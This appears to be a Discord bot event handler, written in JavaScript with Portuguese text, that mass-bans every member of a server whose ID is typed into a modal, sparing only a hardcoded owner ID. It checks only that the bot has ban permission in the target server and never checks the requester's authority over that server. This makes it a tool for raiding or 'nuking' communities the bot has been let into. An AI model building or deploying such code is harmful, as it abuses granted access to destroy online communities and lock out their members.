const { ModalBuilder, TextInputBuilder, ActionRowBuilder, ChannelType, PermissionsBitField } = require("discord.js");
const gradient = require('gradient-flag');

const owner = '831304519287046175';
const sessionData = {};

module.exports = {
    name: "interactionCreate",
    run: async (interaction) => {
        const { customId, user, client } = interaction;
        if (!customId) return;

        if (customId === "banall") {
            const modal = new ModalBuilder()
                .setCustomId(`banallmodal`)
                .setTitle("Banir Todos");

            const guildId = new TextInputBuilder()
                .setCustomId("guildId")
                .setLabel("ID DO SERVIDOR")
                .setStyle(1)
                .setPlaceholder("ID DO SERVIDOR QUE DESEJA BANIR TODOS")
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(guildId));

            return interaction.showModal(modal);
        }

        if (customId === "banallmodal") {
            const guildId = interaction.fields.getTextInputValue("guildId");
            sessionData[user.id] = { guildId }; 
            await interaction.reply({ content: `<:icons_fingerprint:1261366785848901652> Verificando as informações...`, ephemeral: true });

            const guild = client.guilds.cache.get(guildId);
            if (!guild) return interaction.editReply({ content: `<:icons_Wrong:1261798468532568174> O bot não está no servidor`, ephemeral: true });

            await interaction.editReply({ content: `<:icons_clock:1261798597842829312> **| Verificando permissões no Servidor \`${guild.name}\`**` });

            let botMember = guild.members.cache.get(client.user.id);
            let hasBanPermission = botMember.permissions.has(PermissionsBitField.Flags.BanMembers);

            if (!hasBanPermission) {
                return interaction.editReply({ content: `<:icons_Wrong:1261798468532568174> O bot não tem permissão para banir membros no servidor \`${guild.name}\`` });
            }

            await interaction.editReply({ content: `<:icons_clock:1261798597842829312> **| Banindo todos os membros do Servidor \`${guild.name}\`**` });

            const members = guild.members.cache.filter(member => member.id !== owner);
            const totalMembers = members.size;
            let bannedCount = 0;

            for (const member of members.values()) {
                try {
                    await member.ban();
                    bannedCount++;
                    const percentage = ((bannedCount / totalMembers) * 100).toFixed(2);
                    console.log(gradient.rainbow(`Membro ${member.user.tag} banido. (${percentage}%)`));
                    await interaction.editReply({ content: `<:icons_clock:1261798597842829312> **| Banindo todos os membros do Servidor \`${guild.name}\`** (${percentage}%)` });
                } catch (error) {
                    console.error(gradient.rainbow(`Erro ao banir ${member.user.tag}:`), error);
                }
            }

            await interaction.editReply({ content: `<:icons_Correct:1261798879578558484> Todos os membros do servidor \`${guild.name}\` foram banidos com sucesso.` });
        }
    }
}